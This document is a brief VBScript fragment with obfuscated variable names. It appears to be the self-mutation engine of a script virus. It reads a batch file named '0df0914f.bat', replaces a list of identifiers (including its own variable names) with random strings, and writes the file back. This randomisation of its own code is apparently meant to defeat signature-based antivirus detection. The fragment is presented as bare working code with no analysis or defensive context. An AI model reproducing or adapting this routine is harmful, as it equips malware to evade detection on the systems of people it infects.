Randomize
Set k8f4e0k5 = CreateObject("scripting.filesystemobject")
Set e4v7c6o8 = k8f4e0k5.opentextfile("0df0914f.bat", 1)
k8j0k2k3 = e4v7c6o8.readall
q2j0h8c3 = "o7s5t0d1 a7h1t1q1 d4a1o3d1 e7q8m7n7 n1q6r6f3 r5l0m5f6 l5t6s3r7 i5p5m4d3 k8j0k2k3 q2j0h8c3 k1q4p4e4 u4e8c5c8 o8i4r1b5 e4q1d4j8 k8f4e0k5 e4v7c6o8": k1q4p4e4 = Split(q2j0h8c3, " ")
For Each u4e8c5c8 In k1q4p4e4
For o8i4r1b5 = 1 To 4: e4q1d4j8 = e4q1d4j8 & Chr((Int(Rnd * 22) + 97)) & Int(Rnd * 9): Next
k8j0k2k3 = Replace(k8j0k2k3, u4e8c5c8, e4q1d4j8): e4q1d4j8 = ""
Next
Set e4v7c6o8 = k8f4e0k5.opentextfile("0df0914f.bat", 2, 1)
e4v7c6o8.writeline k8j0k2k3
e4v7c6o8.Close
